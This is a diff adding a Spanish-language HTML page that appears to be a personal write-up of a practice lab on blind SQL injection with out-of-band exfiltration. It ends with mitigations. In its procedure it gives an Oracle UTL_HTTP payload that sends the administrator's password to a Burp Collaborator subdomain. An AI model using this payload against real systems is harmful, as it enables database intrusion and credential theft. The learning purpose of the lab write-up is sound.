@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+<meta charset="UTF-8">
+<title>Lab 17 - Out-of-Band Data Exfiltration</title>
+
+<link rel="stylesheet" href="../style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+</head>
+
+<body>
+
+<nav class="navbar">
+<div class="nav-content">
+<div class="logo">AG<span>.</span></div>
+
+<div class="links">
+<a href="../index.html">Inicio</a>
+<a href="../roadmap/sql-injection.html">Volver a Labs</a>
+</div>
+</div>
+</nav>
+
+
+<section class="activities-section">
+
+<div class="activities-container">
+
+<div class="activities-header">
+<h2><i class="fas fa-database"></i> Lab 17</h2>
+<p>Blind SQL injection with out-of-band data exfiltration</p>
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-layer-group"></i> Información del laboratorio</h3>
+
+<p><strong>Nivel:</strong> Practitioner</p>
+<p><strong>Tipo de SQLi:</strong> Out-of-band SQL Injection</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-bullseye"></i> Objetivo</h3>
+
+<p>
+Explotar una vulnerabilidad SQL Injection en la cookie de seguimiento
+para exfiltrar información de la base de datos mediante
+<strong>Burp Collaborator</strong>.
+</p>
+
+<p>
+El objetivo es recuperar la contraseña del usuario
+<strong>administrator</strong>.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+
+<p><strong>Paso 1 — Interceptar la petición</strong></p>
+
+<p>
+Se interceptó la solicitud HTTP principal del sitio web
+utilizando Burp Suite.
+</p>
+
+<p>
+El parámetro vulnerable se encontraba en la cookie:
+</p>
+
+<pre>
+TrackingId
+</pre>
+
+
+<p><strong>Paso 2 — Generar dominio de Burp Collaborator</strong></p>
+
+<p>
+Se generó un subdominio único utilizando la herramienta
+<strong>Burp Collaborator Client</strong>.
+</p>
+
+
+<p><strong>Paso 3 — Construir el payload</strong></p>
+
+<p>
+Se utilizó una carga útil diseñada para Oracle
+capaz de generar consultas DNS externas.
+</p>
+
+
+<p><strong>Payload utilizado</strong></p>
+
+<pre>
+'||UTL_HTTP.request('http://SUBDOMINIO.burpcollaborator.net/'||
+(SELECT password FROM users WHERE username='administrator'))--
+</pre>
+
+
+<p>
+El payload concatena el resultado de la consulta SQL
+con el dominio del Collaborator.
+</p>
+
+
+<p><strong>Paso 4 — Enviar la solicitud</strong></p>
+
+<p>
+La petición fue enviada desde Burp Repeater
+y posteriormente se consultaron las interacciones
+registradas en Burp Collaborator.
+</p>
+
+
+<p>
+El servidor realizó una solicitud DNS hacia el subdominio
+incluyendo la contraseña del administrador en la URL.
+</p>
+
+
+<p>
+Con las credenciales obtenidas se pudo iniciar sesión
+como administrador.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+
+<ul>
+
+<li>Uso de consultas parametrizadas.</li>
+
+<li>Deshabilitar funciones externas innecesarias en la base de datos.</li>
+
+<li>Control de tráfico DNS saliente.</li>
+
+<li>Monitoreo de interacciones externas sospechosas.</li>
+
+</ul>
+
+</div>
+
+
+<a href="../roadmap/sql-injection.html" class="back-btn">
+<i class="fas fa-arrow-left"></i> Volver a laboratorios
+</a>
+
+</div>
+
+</section>
+
+</body>
+</html>
